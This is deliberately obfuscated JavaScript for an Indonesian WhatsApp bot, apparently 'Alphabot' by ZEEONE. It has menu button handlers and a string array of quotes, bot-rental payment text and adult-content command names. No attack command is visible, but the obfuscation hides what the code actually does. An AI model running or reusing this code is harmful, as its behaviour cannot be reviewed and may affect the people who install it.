_0x1dc4ba={};_0x1dc4ba[_0x1e23e4(-0x145,0x4a0,0x200,0x369)]=_0x593f96(0x312,-0x8f,0x92,0x63),_0x1dc4ba[_0x1e23e4(-0x112,0x16b,0xc6,-0x445)]=_0x3a32b0,_0x1dc4ba['type']=0x1;const _0x28d930={};_0x28d930[_0x593f96(0x3bc,0x189,0x2ac,0x448)+'t']='✓\x20OWNER';const _0x4e12a2={};_0x4e12a2[_0x593f96(0x3de,0x2af,0x54c,0x541)]='owner',_0x4e12a2[_0x1e23e4(0x35,-0x6,0xc6,0x1df)]=_0x28d930,_0x4e12a2[_0x1e23e4(0x64f,0x5e3,0x9a0,0x6d3)]=0x1,sendButLocation(from,storagemenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(0x222,0x2ee,0xd3,0x64)+ini_mark[_0x1e23e4(0x3e9,0xa3,0x133,-0x20c)]('@')[-0x2*0x43f+-0x8f*0xe+0x828*0x2],storagemsn,[_0x1dc4ba,_0x4e12a2],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='tagmenu'){console[_0x593f96(0x76c,0xacb,0x2eb,0xb11)](color(time,_0x593f96(0x359,0x229,-0xb8,0x2b)),color(_0x593f96(0x587,0x677,0x7af,0x129)+_0x1e23e4(0x4ce,0x27e,0x6e3,0x5d3)));var tagmwnjn=await getBuffer(_0x1e23e4(0x303,0x524,0x165,0x601)+_0x1e23e4(0xab5,0x2a5,0x664,0x4e7)+_0x593f96(0x622,0x577,0x487,0x3ce)+_0x1e23e4(0x3b7,0x960,0x4e5,0x393)+_0x593f96(0x9d6,0xd33,0x5f0,0xba6));const _0xfb296c={};_0xfb296c['displayTex'+'t']='⋮☰\x20BACK';const _0x1a6cfe={};_0x1a6cfe['buttonId']='Command',_0x1a6cfe[_0x593f96(0x2a4,0x60c,0x43b,0x550)]=_0xfb296c,_0x1a6cfe[_0x1e23e4(0x7ba,0x858,0x9a0,0xc5d)]=0x1;const _0x17b332={};_0x17b332['displayTex'+'t']=_0x1e23e4(0x8d5,0xa5d,0x59f,0x233);const _0x9f5d2a={};_0x9f5d2a[_0x1e23e4(0x10a,0x1ac,0x200,0x40)]=_0x1e23e4(0x60a,0x316,0x279,0x35e),_0x9f5d2a[_0x593f96(0x2a4,-0x12b,0x6ec,-0x40)]=_0x17b332,_0x9f5d2a[_0x1e23e4(0xcb2,0x90c,0x9a0,0xacc)]=0x1,sendButLocation(from,tagmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(-0x8b,0x410,0xd3,0x59b)+ini_mark[_0x593f96(0x311,0x447,0x709,0x492)]('@')[-0x1d66+0xf36+0x4*0x38c],tagmwnjn,[_0x1a6cfe,_0x9f5d2a],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0xcc1,0x9e5,0x1057,0xdc8)){console[_0x1e23e4(0x554,0x42f,0x58e,0x48f)](color(time,_0x1e23e4(0x2a6,0x1de,0x17b,0x46e)),color(_0x593f96(0x587,0x22d,0x345,0x4f3)+_0x1e23e4(0x759,0x3bf,0x3cb,0x166)));var upmenuj=await getBuffer(_0x593f96(0x343,0x2bb,0x2f6,0x205)+_0x1e23e4(0xae5,0x57c,0x664,0x9d9)+_0x1e23e4(0x9a1,0x58e,0x981,0xe08)+_0x593f96(0x4a1,0x16a,0x84,0x256)+'b9509.jpg');const _0x5e5c34={};_0x5e5c34[_0x593f96(0x3bc,0xd1,-0xaa,-0x31)+'t']=_0x593f96(0x7d6,0x4f9,0x3b9,0x9f8);const _0xcc41c7={};_0xcc41c7[_0x593f96(0x3de,-0x139,0x289,0x237)]='Command',_0xcc41c7[_0x1e23e4(0x19b,-0x1cb,0xc6,0x1ba)]=_0x5e5c34,_0xcc41c7[_0x593f96(0xb7e,0xc40,0x6b3,0xf5d)]=0x1;const _0x2b6355={};_0x2b6355[_0x593f96(0x3bc,0x140,0x56,0x305)+'t']=_0x593f96(0x77d,0x524,0x3b7,0x7b1);const _0x3045f4={};_0x3045f4['buttonId']=_0x593f96(0x457,0x39a,0x2a4,0x168),_0x3045f4[_0x593f96(0x2a4,0x410,0x3ba,0x5d6)]=_0x2b6355,_0x3045f4['type']=0x1,sendButLocation(from,upmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(-0x34b,0x320,0xd3,-0xa2)+ini_mark[_0x593f96(0x311,-0x8c,0x135,0x753)]('@')[-0x1422+-0x1619+-0x2a3b*-0x1],upmenuj,[_0xcc41c7,_0x3045f4],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x8ba,0x9a6,0x5dd,0xb15)+_0x1e23e4(0x3d2,0x1b7,0x112,0x424)){console['log'](color(time,'magenta'),color('List\x20messa'+'ge\x20set\x20sti'+_0x593f96(0x59b,0xa0c,0xf2,0x1de)));var setcmdks=await getBuffer(_0x593f96(0x343,0x2a9,0x557,0x114)+_0x1e23e4(0xb4f,0x63f,0x664,0x198)+'ile/96b7da'+'1da2234005'+_0x593f96(0x979,0x8a4,0xa63,0xc51));const _0x111e4c={};_0x111e4c['displayTex'+'t']=_0x593f96(0x7d6,0xb19,0x60b,0x6c1);const _0x13bc71={};_0x13bc71[_0x593f96(0x3de,0x343,0x399,0x4e)]=_0x1e23e4(0x3b6,0x3b2,0x134,-0x29e),_0x13bc71[_0x1e23e4(0x45e,-0x355,0xc6,0x31a)]=_0x111e4c,_0x13bc71[_0x593f96(0xb7e,0xe88,0x9fd,0x8ea)]=0x1;const _0x41981f={};_0x41981f['displayTex'+'t']='✓\x20OWNER';const _0xaa9ae5={};_0xaa9ae5['buttonId']='owner',_0xaa9ae5[_0x593f96(0x2a4,0x529,0x4ce,0x666)]=_0x41981f,_0xaa9ae5[_0x593f96(0xb7e,0x7ee,0xd2e,0x7fa)]=0x1,sendButLocation(from,set_stc_cmd(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x1e23e4(0x93,0x8d,0x133,0x427)]('@')[-0x67d+0x10cf*-0x1+0x174c],setcmdks,[_0x13bc71,_0xaa9ae5],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x743,0xa4a,0x4f2,0xa12)+'n'){console[_0x1e23e4(0x604,0x992,0x58e,0x971)](color(time,'magenta'),color(_0x593f96(0x587,0x435,0x708,0x3dd)+_0x1e23e4(0xa5c,0x21a,0x5ed,0x4b1)+_0x1e23e4(0xb6c,0x3ee,0x7d4,0x2c9)));var cecanksk=await getBuffer(_0x1e23e4(0x7f,0xb6,0x165,0x206)+_0x1e23e4(0x653,0x3f2,0x664,0x29e)+_0x593f96(0x53a,0x985,0x4b8,0x2a7)+_0x593f96(0x53d,0x3ce,0x9de,0x41f)+_0x593f96(0x673,0x74a,0x509,0xa0b));const _0x4e45b7={};_0x4e45b7['displayTex'+'t']=_0x1e23e4(0xaf4,0x881,0x5f8,0xa0b);const _0x5f4608={};_0x5f4608[_0x1e23e4(0x579,0x445,0x200,0x60d)]=_0x1e23e4(0x3ee,-0x2b3,0x134,-0x303),_0x5f4608[_0x593f96(0x2a4,0x69e,0x2bb,-0x7e)]=_0x4e45b7,_0x5f4608[_0x1e23e4(0x7e8,0x80f,0x9a0,0xa2b)]=0x1;const _0x5b9d80={};_0x5b9d80[_0x1e23e4(-0x2cf,-0x1e1,0x1de,-0x13f)+'t']=_0x1e23e4(0xaa8,0x624,0x59f,0x5ab);const _0xb4179d={};_0xb4179d[_0x593f96(0x3de,0x25a,0x4b8,0x28c)]=_0x593f96(0x457,0x35e,0x4f6,0x884),_0xb4179d[_0x1e23e4(-0x372,0x1ca,0xc6,0x159)]=_0x5b9d80,_0xb4179d['type']=0x1,sendButLocation(from,cecanmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(-0x1db,0x3,0xd3,-0xb2)+ini_mark[_0x1e23e4(0x1e3,0x2f6,0x133,0x55f)]('@')[-0x1*-0xcc5+0x13a6+-0x206b],cecanksk,[_0x5f4608,_0xb4179d],{'contextInfo':{'mentionedJid':[ini_mark]}});}function _0x1e23e4(_0xeae096,_0x518837,_0x10fc6e,_0x5ae721){return _0x1511(_0x10fc6e-0x6,_0x5ae721);}function _0xa790(){const _0x43fe29=['ji\x20karakte','holoyero','“Berlatih\x20','kalau\x20tida','enger-','product','HH:mm:ss','ka\x20Lupa\x20Pa','use\x20the\x20st','pada\x20banya','cwBIE','select\x20the','delvira','\x20menu\x20comm','ke\x20lawan\x20j','/p_2032z7a','\x20™©\x20|\x20By\x20','rimu\x20menye','alloc','orig','YMsYMtnlnb','bVLac','pp/surah/','qr_gopay18','\x20this\x20scri','chika','offline','essage','mbnail','riyas_grem','pb1.jpg','\x20Media','seperti\x20ha','ku\x20pake\x20ce','https://g.','format','productId','pernah\x20nol','karena\x20mem','Kita\x20tak\x20b','mu,\x20dan\x20ma','kalo\x20tidur','Example:\x20','\x20inginkan,','h\x20datang,\x20','n\x20ke\x20manta','ytmp4doc\x20','kimminseok','\x20yaitu\x20pas','Manusia\x20ak','listMessag','kaki\x20lima\x20','📖\x20List\x20Men','aminan\x20keh','sage\x20Payme','idup\x20adala','sangan\x20hid','/ttpcustom','dQhpI','BaJsK','ntah\x20*','SALEHA\x20(Su','ketik\x20pake','an\x20bahagia','.php?url=','QGyIl','nHTwv','rd\x20@','1823004EenZPS','qr_dana13','ng\x20:*\x20','nya\x20sendir','sudah\x20repo','gi\x20pemanda','6288743504','idak\x20sangg','\x20\x0a\x0a_','der','\x20tag\x20stike','\x20-\x20','use\x20the\x20ns','mengerjaka','sih\x20jomblo','\x20meriang-m','mio_akiyam','ng.','or=white@0','korea','sage\x20Nomor','ua\x20pria\x20me','elas\x20lalu\x20','ile/6941a5','uran\x20diman','/p_2032vcy','kali\x20Kena\x20','_Silahkan\x20','September','result','oxqkd','\x20jadi\x20\x22\x20BO','\x0a\x0a•\x20ZEEONE','ak\x20akan\x20ku','an\x20tetap\x20s','🏅\x20Source\x20s','api/imageg','admin','poke','WgkrC','g,\x20karena\x20','QcVJk','mizore_sir','asupan\x20men','cepat\x20atau','ri\x20akar\x20te','goprem','a\x20lebih\x20ke','Kirim\x20peri','las,\x20yang\x20','hala\x20yang\x20','\x20kalo\x20peng','rViWw','Instagram\x20','type','MGaLV','mxtVS','r\x20?”','TxSNw','\x20Bayar\x0a3.\x20','sh/pacar\x20s','message','Subscribe\x20','zpuCm','dul\x20video\x20','\x20dalam\x20ben','AK\x20BOHONG\x22','ia\x20yaitu\x20v','doge','9YP2ZQn4','pa\x20saat\x20la','Dengan\x20dem','e..._','ext=','h%22%3Afal','lam\x20usahan','use\x20the\x20ow','salahan\x20co','vPEnp','Jangan\x20kli','SXvow','🐣\x20All\x20menu','🐣\x20Title\x20:\x20','\x20adalah\x20ke','https://yo','nsfw_neko_','vhPtL','\x20Karena\x20ya','this\x20if\x20yo','videoMessa','Ex\x20:','_\x0a\x0a','video/mp4','hope_boy','GQFHr','*Link*\x20:\x20','yjvZL','WAScO','tuk\x20link_','dari\x20batas','mburu\x20Mile','n\x20bilang\x20\x22','u\x20bot\x20sila','68abaa14f7','https://ne','i\x20pertama.','thumbnailU','♉\x20Menu\x20ke-','ke\x20Beha)\x20a','reka\x20menja','hv\x20crush\x20o','futanari','ap\x20kerasla','n,\x20aku\x20tid','Agustus','ama,\x20bersi','\x0a\x0a•>\x20Nama\x20','untuk\x20nafs','Halo\x20@','\x20dapatkan\x20','idex-','ge\x20source\x20','Bila\x20tekad','\x20pernah\x20ce','e91d325a70','PtUQr','s:\x20','save','“Saat\x20kamu','s\x20💞','join\x20the\x20g','\x20harganya\x20','\x20,\x20atau\x20GO','Sederhana\x20','BiVTz','ya.\x20Yang\x20s','fline','i\x20sesuatu\x20','♀️\x20Menu\x20ke-','at\x20anda\x20te','rd\x20dan\x20Vis','agi\x20sedih\x20','tungkan\x20da','n\x20bermimpi','684ea07ea1','.\x20Namun,\x20j','iskin.\x20Tap','apa?','aya\x20Apa\x20Sa','n\x20botnya\x20','Watermark','ephemeralM','ero','MWTmq','n\x20Bot!','enis\x20yang\x20','t.com/reso',',\x20dan..\x20pa','HXaFJ','lestc\x20comm','e\x20kata\x20kas','qrVOh','inum\x20pasti','popoci','\x0a5.\x20Selesa','followers','jelek,\x20jan','ge\x20image\x20e','Emoji-Appl','Asia/Jakar','Jadi\x20jika\x20','sic.mp3','c41.jpg','tiktokaudi','Kirim\x20pesa','QR\x20CODE','Juni','sa\x20menghas','Penundaan\x20','amu.\x20Tapi,','t,\x20bagaima','\x20sampai\x20sa','ana13','resource_r','dalah\x20pinc','kjSlW','upport','ngChange','Alphabot\x20s','Kita\x20tidak','FBiAT','ributed\x20to','ipe\x20pacar\x20','kYt]*','solog','r\x20oleh\x20ser','fileSha256','selectedBu','at\x20orang\x20l','ticker','maka\x20akan\x20','gecg','tu\x20hubunga','zVjAJ','s.whatsapp','wqylA','ang\x20kamu\x20a','wnloadmenu','\x20jomblo\x20it','\x20mantan\x20da','sage\x20Sewa\x20','ecan/','\x20sukses\x20it','minum\x20kopi','orfLc','rose','\x20orang\x20yan','yVijm','it\x20dahulu,','mu\x20beleum\x20','\x20mantan\x20pa','ge\x20welcome','ya\x20setiap\x20','Hanya\x20bisa','📠\x20Qr\x20Code','IoolE','♊\x20Menu\x20ke-','nusia.\x20Tap','IyAHv','i\x0a\x0a_Regard','JoROz','join','an\x20turun\x20k','downloadAn',',\x20berkobar','uah\x20negara','bx/mFEB8SW','masa\x20lalu,','ng\x20kita\x20ha','HWNrJ','ak\x20ingin\x20t','/p_2068b7j','t\x20siapa\x20se','GJYTz','ang-pasang','[a][b];\x20[a','pi/v2/img/','tFxIn','\x20jaminan\x20k','seMessage','g,\x20maka\x20se','sewabot','wZadK','mime','\x20mereka\x20pa','Yah\x20gagal,','text','6283136505','ahun\x20ini?','g\x20baik\x20unt','rowId','sah\x20payah\x20','Testing\x20sp','LiyhQ','Saat\x20yang\x20','ge\x20Sewabot','TLkNA','ytmp4','dang\x20dikir','Downloader','ppcouple','*🔗\x20Link\x20:*','bat\x20buruk\x20','photooxyme','i\x20celana\x20A','sage','ting?\x20Taku','fileName','☣️\x20Menu\x20ke-','fwmenu\x20com','🎧\x20*Y\x20O\x20U\x20T','bulannya','oezJP','EL\x0a•\x20SATRI','kepada\x20All','ngan\x20cara\x20','uan\x20dan\x20me','tuk\x20Anda,\x20','original_a','a\x20Aplikasi','22options%','getsider','elajaran\x20s','ic.mp3','ripada\x20ber','utube.com/','tahun-tahu','nime/','stri\x20yang\x20','ernyata\x20pe','n\x20Masukkan','pekerjaan\x20','deleteMess','getYear','https://d.','gasm','t\x20yang\x20kua','saya\x20menja','tBAWo','atu\x20kampun','azJbI','u\x20adalah\x20s','MODE*\x20」','xk1.jpg','YucrN','\x20ss\x20drop\x20k','々\x20Size\x20:\x20','use\x20the\x20up','%2C%22no_f','iIJQk','enyapanya,','unda.”','ba\x20ulangi\x20','⚜️\x20Menu\x20ke-','catch','isForwarde','ng\x20dan\x20mer','t\x20diputusk','zvkYG','vietnam','🤥\x20setiap\x20n','nangkan\x20😇,','image/','SdzBP','BdTXb',',fps=15,\x20p','VllcG','BQxoB','tai','Tiktok\x20WM.','🏅\x20Source\x20S','seconds','menu\x20comma','tydER','ofc','\x20tidak\x20tul','ang\x20lain.','🍃\x20*Link*\x20:','xTH6oLd8','https://e.','Aku\x20gak\x20pa','getSeconds','\x20pekerjaan','anmu','📍\x20Nama\x20:\x20@','♑\x20Menu\x20ke-','ibu\x20pengem','SELECT\x20HER','k\x20ada\x20manu','“Diam\x20itu\x20','audio/mp4','ke\x20metode\x20','\x20miring.”','a\x20bagi\x20wan','```','igstory','YlORl','ng\x20tertund','*Cewe*','SuITq','cv1.jpg','\x20merasa\x20ce','nt\x20Gopay','18241b0142','Speed:\x20','c/zeeoneof','nmu','upmenu','itu\x20sama\x20d','\x20didalam\x20g','chats','aya\x20tidak\x20','kbps)','api','mpurna\x20aka','menu','FosfJ','SINGLE_SEL','\x0a\x0a_choose\x20','erjebak\x20ol','ile/851e79','yang\x20SIAGA','gojosatoru','\x20dan\x20masa\x20','kelihatan\x20','Hay\x20@','ge\x20ownerme','ah)\x20&\x20jadi','following','undefined','kimnanjoon','lose','buttonText','“Jangan\x20pe','gan\x20sebaik','\x20adalah\x20se','LbqnC','6288279575','cintai,\x20be','a\x20saat\x20men','☠️\x20Owner\x20','mentionedJ','🐺\x20Link\x20:\x20','match','be.com/cha','Regard\x20@','gar\x20jadi\x20S','rs\x20:*\x20','no-cache','more\x20quote','aik\x20untuk\x20','aRKRM','\x20di\x20dunia\x20','Hi\x20','use\x20the\x20ma','miskin\x20tid','body','\x20bukan\x20tin','an\x20dalam\x20h','\x20akan\x20dili','“Manusia\x20i','ad=320:320','is\x20yang\x20ad','u\x20ubah\x20jad','\x20Second*','Tiktok\x20No\x20','sukai\x20diam','rkreasi\x20da','elanga…\x20Ga','dbfly','sambut\x20den','ang\x20aku\x20se','priceAmoun','Kita\x20adala','wallpaper','sourceUrl','t\x20support\x20','link','ngan\x20erat\x20','\x20yakin\x20nih','Reply','r\x20nya\x20lord','/p_2068ity','Emoji-Micr','kebohongan','n&apikey=h','lor\x20=\x20blac','katalog','hal\x20memban','ritaan','ia.','Emoji-JoyP','hololewd','Button\x20Mes','opay13','e\x20:*\x20','ya_kak','h\x20Watermar','Emoji-emoj','kimseok','338BA8186C','nah\x20mencob','Dik\x20jangan','mediaUrl','=0.9','nget','ta…tapi\x20sa','selectedDi','r\x20cmd','wn|cyan|da','ses\x20maka\x20l','a\x20dari\x20Bio','7326@s.wha','CaWcp','reply\x20pesa','t\x20media\x20ak','rgabung\x20da','ata',',\x20metode\x20y','\x20114\x203','gan\x20cara\x20k','ail','\x20NEW\x20VER.*','DVboC','Video\x20(720','Big\x20Thanks','ssage','femdom','PAYMENT\x20DA','remoteJid','pageCount','NgIXA','Februari','aimu.','Durasi\x20Sti','donasi_kak','ter-','tu\x20adalah\x20','red','cTOwR','ang\x20yang\x20b','split','Command','an\x20pacar,\x20','Next\x20➡️','ia\x20OVO,\x20DA','dio','Cinta\x20buka','instareels','OVylk','keta','amu','play\x20query','ownload_','n\x20dipilih!','hermenu\x20co','sendEpheme','wait','ile/e2c139','map','langsung😇','a,\x20agar\x20te','ika\x20masala','dang\x20berpu','tu\x20dia\x20unt','ap\x20basah.”','/p_20325yp','pnsTX','pvBov','pasrahkan\x20','\x20butuh\x20beb','amu,\x20terus','siapa\x20oran','url','nsfw_avata','asi\x20lebih\x20','Anda\x20menja','“Cintailah','*🎶\x20YOUTUBE','kerasukan,','p.com/EU89','/p_2068e50','々\x20Link\x20:\x20','Bagiku,\x20Ka','hentai','🐭\x20*Size*\x20:','d?name=','OhSaZ','ge\x20textpro','MBJjM','goose','https://te','KZqeL7byF+','boobs','menemukann','Video\x20(108','-stdout','spect_rati','ic\x20Downloa','idak\x20minum','sento_isuz','\x20yang\x20tert','di\x20bijak\x20s','hpZMy','caya\x20diri.','applicatio','eneran\x20😎\x20','njimm\x20gabu','a,\x20jika\x20ka','sewa_kak','ogan/','Kirim\x20gamb','e\x20code\x20thi','magenta','eo\x20or\x20Audi','hug,','jid','rnah\x20berfi','GOPAY\x20via\x20','convertmen','i\x20kekayaan','telfon\x20cru','WzROg','gRhyp','pernah\x20suk','ttp2','“Wanita\x20ya','anya\x20dua','umptweet&t','\x20Jadi\x20kena','gkin\x20jodoh','⋮☰\x20MENU','awoawo','slap','TriAI','tong','\x20lalu\x20kiri','tat\x20yang\x20s','lebih\x20dari','n\x20ss\x20ke\x20pe','yuzuki','annya)\x20kep','n\x20you,\x20mau','tek\x20yang\x20p','a.”','age\x20effect','[PlayMp3]','🐨\x20Owner','X/A=','arah\x20yang\x20','quran-api-','ek\x20sendiri','📛\x20*Usernam','ion','*🎧\x20P\x20L\x20A\x20Y','urce/BaseS','g\x20sok\x20tau,','zGFgK','ah\x20nomor_a','Emoji-Sams','cors','T*\x0a\x0a','caption,\x20a','?\x20rasanya\x20','\x20:*\x20480kbp','aan.','akkan\x20diri','rOeJf','da\x20kehidup','999.webp','\x20nyuri\x20uan','iri\x20saya\x20s','kanna','\x20duration\x20','✨\x20*Followi','PAYMENT','ngan\x20aku\x20y','malaysia','n\x20yang\x20bai','kuni','i\x20audio\x20at','dibuat','kirim\x20voic','extendedTe','stickerMes','oruptor\x20di','y7_MoRYlA','ntent','anak\x20saya\x20','🔖\x20Sewa\x20','.0,\x20split\x20','\x20semakin\x20c','ass','utu.be/zq2','reads','besar\x20dari','4i1.jpg','*Data\x20Berh','videos','angkuk\x20bua','kawan_spon','DOC','k\x20susu\x20seb','a\x20apa\x20nih?','ss\x20recent\x20','\x20\x0a🎃\x20Size\x20:','984f9.jpg','STC\x20CMD\x20GR','oba\x20bebera','gar\x20hidup\x20','ownermenu','\x20kejujuran','displayTex','cXJuv','\x20banyak\x20ng','imemenu\x20co','amongus\x20\x20c','351.jpg','ral','akit\x20dahul','a\x20mengubah','ik…\x20Lupa\x20a','senang.','igvideo','elegram_st','n\x20membasah','G\x20GROUP```','ak\x20tawa\x20ak','xKUuf','teriak\x20pak','\x20support\x20&','eriang\x20kem','le.js','sMtzz','h\x20atau\x20kal','wjrYH','Apabila\x20se','waitForAck','tory','unya\x20dan\x20m','u\x20mungkin\x20','membuat\x20ki','Kalau\x20bole','nt\x20Dana','\x20negara\x20te','WO\x20\x22\x20selam','buttonId','i\x20Anda\x20han','\x20Anda.\x20Dir','```Jadikan','-renang\x20ke','sponsbob','h\x20satu','tofOr','\x20|\x20','cuckold','akan\x20hancu','™©\x20|\x20By\x20','e\x20you\x20repl','k,\x20niscaya','Jangan\x20per','Mohon\x20maaf','0f7eb.jpg','💋\x20*Fullnam','zNXtN','descriptio','images','-officedoc','Desember','i\x20tertangk','9a236a4','perasaan\x20c','gan\x20jika\x20k','VOWwq','💞\x20Ya','ang\x20masuk\x20','\x20bilang\x20ke','\x20diri\x20send','ita\x20tidak\x20','\x20database.','a,\x20maka\x20An','risi\x20dari\x20','audioMessa','Ilmu\x20penge','book-','\x20(Siap\x20Ant','inputForma','pa\x20aja\x20dit','💦\x20Title\x20:\x20','\x0a🐣\x20Upload\x20','of\x20more\x20th','endsWith','Bahagialah','an\x20terkuat','a\x20pulsa\x20bi','productMes','aha\x20adalah','gangbang','chat','shinka','utu.be/POj','-vf','rat\x20apapun','af9c61265d','an\x20tonton\x20','akan\x20dan\x20t','uhkan\x20agar','ilih\x20Pay\x20/','\x20melempar\x20','u\x20apa,\x20tap','replace','[p]\x20palett','\x20ke\x20kamu.','pap\x20mukamu','l\x20pembayar','anyak\x20bela','en=reserve','jungkook','🐣\x20*Title\x20:','n\x20yang\x20tid','Lebih\x20baik','rapa\x20lama?','MU\x20CANTIK\x20','fb7e261a68','othermenu','1;37m>','ngan\x20sampa','.presentat','ented\x20in\x20t','classic','ori','bdsm','elak\x20tawa\x20','TdpXS','SUxwG','09438.jpg','Tidak\x20ada\x20','\x20nih\x20video','🔢\x20Nomor','dicari_','lLgEt','00587','YSEDJ','yang\x20akan\x20','iajlW','k\x20seorang\x20','medias','dengan\x20bij','https://h.','PBwuO','membuat\x20se','LIST\x20EMOJI','SjKrj','on\x20:\x20','thumbnail','anna','om/','phabot\x20','blowjob','otooxymenu','getMonth','xtpromenu\x20','MAGE\x20','aWQyt','end','smug','nmu\x20yang\x20a','owner','ixels-','Youtube\x20Mp','Alquran\x20Au','gacha\x20coga','oragemenu\x20','onlygc','bRKDa','\x0a🍃\x20Views:\x20','cript\x20bot','ung-','kemonomimi','ebih\x20baik\x20','\x20memilih\x20u','pernah\x20jad','\x20ingin\x20suk','ttmp4','Ketika\x20kam','aura','00000','50109.jpg','gtzvA','\x0a\x0a_Powered','floor','g..??”','Hidup\x20itu\x20','e\x20bawah\x20da','age','\x20*READ*','akukan\x20apa','lmenu\x20comm','sVHmi','a\x20ikut\x20ter','Link\x20tidak','an\x20kalau\x20y','CYbxA','f719b8edb2','QFvxi','\x204!*','lah\x20seseor','tpwXOQusBR','sakura','akin\x20banya','lu\x20sih\x20nam','Orang-oran','at\x20ini\x20mun','icker/','pztlA','sudah\x20tert','dah.\x20Biar.','Emoji-What','TroNB','yang\x20membu','\x20DOWNLOADE','jisoo','DvRAM','pernah\x20cin','the\x20messag','tagmenu','pussy','ah\x20satu\x20an','qr_ovo18','di\x20tahun\x20i','utu.be/BjT','ge\x20telegra','hSolP','ile/8e308c','“Cara\x20terb','les','\x20Silahkan\x20','_\x0a\x0aPowered','rsebut\x20sam','IVddO','amongus','f5bcc57f70','dia\x20kekuas','Tiktok\x20Wit','ar\x20seharus','WUtud','an\x20lagu/qu','getMinutes','benedict','amu\x20sakit\x20','VINZ\x0a•\x20MIS','RQfuV','entationml','satu\x20saja\x20','ssfqJNsE','icker','mDcFV','Cara\x20palin','at\x20(serah\x20','\x20paling\x20me','amu\x20akan\x20l','contentTex','\x20akan\x20hanc','#share','\x20Tetapi\x20ja','GYDXG','t\x20hati\x20saa','https://j.','\x20didapet\x20a','\x20pgn\x20balik','\x20kehancura','ten\x20untuk\x20','sehat.\x20Gel','*Filesize*','nsfwmo','AGHZa','https://c.','erikan\x20yan','KbSzL','UlgTm','asukan\x20kul','zjBCp','gan\x20mendid','ekarang\x20da','downloadme','mmand_','an\x20Masukka','earchResou','\x20diam\x20dan\x20','JcBuy','video*\x20_Ju','use\x20the\x20do','.\x20Untuk\x20me','?text=','tu\x20dicipta','R*\x0a\x09\x09\x09\x09\x0a','ah\x20pengorb','AAByk','xmlformats','bot\x20silahk','ile/487eeb','dak\x20makan\x20','uk\x20kehidup','\x0a🌀\x20Url\x20:\x20','\x20cinta\x20sam','currencyCo','urce%22%3A','TxMVy','bayar_ovo1','+0Mjbi7yii','elrrc','eed','.com/api','buttonsMes','nya\x20orang-','a.\x20Bisaku\x20','etik\x20@veri','baka','idur.”\x20–\x20P','alah\x20kesal','OYbDH','t\x20support','app\x20mod\x20ka','STC\x20CMD\x20IM','\x20bukan\x20aku','apa','t\x20itu\x20mene','videohd','f\x20[p];\x20[b]','\x20dan\x20meren','\x20luas\x20dari','unlinkSync','ruop','Botwea\x20©2k','tidak\x20ada\x20','\x20kamu\x20belu','\x20by\x20@','kotori_min','utf-8','_\x0a\x0a\x0aCarany','💌\x20*Followe','sewa_1p','\x20yang\x20udah','https://ti','serializeM','Sewa\x20☕','\x20akan\x20liha','arta\x20benda','ote,\x20terus','eopir','\x20OVO,\x20DANA','katabijak_','ge\x20Group\x20W','min\x27(320,i','ang\x20bohong','bBxDW','salahan,\x20c','ak\x20menikah','elihat\x20ke\x20','oVqgH','RDIjM','qDtzN','menyenangk','xt/javascr','image','key','ar\x20dengan\x20','Message','hanya\x20seka','rbelalak\x20a','ING\x20GROUP`','fileEncSha','https://va','\x20mencapai\x20','he\x20form\x20of','vbryx','gkonversi\x20','ang\x20tertun','group\x20clos','ini,\x20Tuhan','Kebencian\x20','\x0a\x0a_Regard\x20','ntuk\x20bahag','bunga','berapa\x20saa','g\x20melelahk','ehat,\x20terd','ak\x20yang\x20ki','Tiktok\x20Mus','qsOKq','messageSen','n\x20bukanlah','ggota\x20grup','noteks','ile/6de20d','97m/gdkX/D','Gw_16l7c','496a8748f2','\x20satu\x20tema','GIRcT','“Wanita\x20ca','lewdk','lewdkemo',',\x20tapi\x20seb','ena\x20aku\x20sa','false%7D%2','fat\x20menjal','storagemen','\x20\x20M\x20P\x203*\x0a\x0a',';\x20dan\x20bagi','sama\x20siapa','Siapa\x20yang','ki\x20yang\x20bi','gue\x20anak\x20l','vYbwk','documentMe','pai\x20tua.”','omong\x20tapi','WmqJc','locationMe','🐭\x20Filesize','KiqMB','ge\x20funmenu','engan\x20ada\x20','ukan\x20oleh\x20','mu\x20jatuh\x20k','g\x20terbaik\x20','panties','sai\x0a\x0a_Rega','XMLHttpReq','SJfBA','\x20boleh\x20keh','emerlangan','intar.”','alang,\x20ker','%2Fsearch%','command_','beberapa\x20k','nsfw\x20menu','\x1b[1;31m~\x1b[','n,\x20kalau\x20k','eron','productIma','ma\x20mencint','\x20\x0a🐣\x20Durati','aya\x20atau\x20m','filename','nvertmenu\x20','Kb\x0a🍃\x20Views','“Berakit-r','aja\x20dibawa','\x20bot','&color=yel','PqwVL','\x20U\x20B\x20E\x20\x20\x20P','All\x20menu\x20b','Sahabat\x20ya','uka\x20sama\x20k','2987d.jpg','&raw=7','\x0a🐨\x20Ext\x20:\x20M','verifikasi','nermenu\x20co','get',':\x20_@','ago','Ogwbs','ejadian\x20ya','ytmp4\x20[lin','n\x20menu','\x20balasan\x20d','List\x20messa','Emror','r\x20di\x20dalam','Scan\x20Barco','97d8a.jpg','🆔\x20*ID\x20:*\x20','\x20ke\x20cowo','salePriceA','Sudah\x20dapa','IumNA','hmu.','*🎦\x20YOUTUBE','*💢\x20Total\x20:','an\x20akan\x20be','Jika\x20kamu\x20','toFixed','semoji','sasuke','emoji','\x20khusus\x20un','cker\x20cmd','di\x20wa/tele','as\x20itu\x20ada','au.\x20Salam\x20','591-161495','boleh\x20beda','iar\x20Tuhan\x20','PHOTO','Juli','emburu\x20itu','roup\x20alpha','a\x20atau\x20tah','\x20OVO\x20via\x20H','meow','ge\x20upmenu','silahkan\x20h','\x20tahu\x20adal','\x20Dan\x20sekar','banyak.”\x20(','externalAd','ekarang\x20de','footerText','uery','65e7d9ab70','i.simsimi.','n\x20segalany','513@s.what','LXxUs','h\x20terhadap','🪀\x20ALPHABOT','Aku\x20enggak','Linknya?','erza',